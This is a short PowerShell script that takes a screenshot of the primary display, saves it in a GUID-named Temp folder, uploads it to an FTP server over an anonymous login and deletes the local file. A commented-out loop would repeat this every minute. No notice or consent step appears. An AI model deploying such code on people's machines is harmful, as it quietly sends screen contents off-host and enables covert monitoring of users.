function Get-ScreenShot {
    $OutPath = "$env:WinDir\Temp\39F28DD9-0677-4EAC-91B8-2112B1515341"
    New-Item -Path $OutPath -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
    $fileName = '{0}.jpg' -f (Get-Date).ToString('yyyyMMdd_HHmmss')
    $fileName = $env:COMPUTERNAME + '_' + $fileName
    $path = Join-Path $OutPath $fileName

    Try {
        # Retrieve screen shot
        Add-Type -AssemblyName System.Windows.Forms
        $b = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
        $g = [System.Drawing.Graphics]::FromImage($b)
        $g.CopyFromScreen((New-Object System.Drawing.Point(0, 0)), (New-Object System.Drawing.Point(0, 0)), $b.Size)
        $g.Dispose()

        # Save to JPEG
        $myEncoder = [System.Drawing.Imaging.Encoder]::Quality
        $encoderParams = New-Object System.Drawing.Imaging.EncoderParameters(1)
        $encoderParams.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter($myEncoder, 20)
        $myImageCodecInfo = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object {$_.MimeType -eq 'image/jpeg'}
        $b.Save($path, $myImageCodecInfo, $($encoderParams))
    }
    Catch {
        Write-Host "Failed to capture screen"
    }

    if (Exists-File -FilePath $path) {
        $item = Get-Item -Path $path
        $ftp = "ftp://s031.nedcar.nl/screens/"
        $webclient = New-Object System.Net.WebClient
        $webclient.Credentials = New-Object System.Net.NetworkCredential('anonymous', 'screens')
        $uri = New-Object System.Uri($ftp + $item.Name)
        $webclient.UploadFile($uri, $item.FullName)

        Remove-Item -Path $path -Force -ErrorAction SilentlyContinue
    }

}

Get-ScreenShot

# Do {
#    Get-ScreenShot
#    Start-Sleep -s 60
# }
# Until ( $False )

